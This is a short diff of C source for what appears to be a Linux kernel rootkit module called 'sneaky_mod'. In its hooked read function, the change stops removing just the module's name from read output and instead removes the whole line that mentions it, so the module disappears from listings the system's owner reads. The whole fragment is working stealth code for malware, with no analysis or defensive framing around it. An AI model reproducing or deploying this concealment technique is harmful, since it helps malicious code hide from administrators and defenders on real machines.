@@ -138,10 +138,18 @@ ssize_t sneaky_read(int fd, void *buf, size_t count) {
     ptr = strstr(buf, "sneaky_mod");
 
     if (ptr != NULL) { // if found: skip it
-      int size_after_it;
-      size_after_it = read_size - 10 - (int)((void*)ptr - buf);
-      memmove(ptr, ptr + 10, size_after_it);
-      read_size -= 10;
+      char* ptr_nl;
+      ptr_nl = strstr(ptr, "\n");  // find that whole line about the "sneaky_mod"
+      if (ptr_nl != NULL) {
+	int size_after_line;
+	int size_of_line;
+	
+	size_of_line = (int)((void*)ptr_nl - (void*)ptr) + 1;
+	size_after_line = read_size - size_of_line - (int)((void*)ptr - buf);
+
+	memmove(ptr, (void*)ptr + size_of_line, size_after_line);
+	read_size -= size_of_line;
+      }
     }
   }
   return read_size;
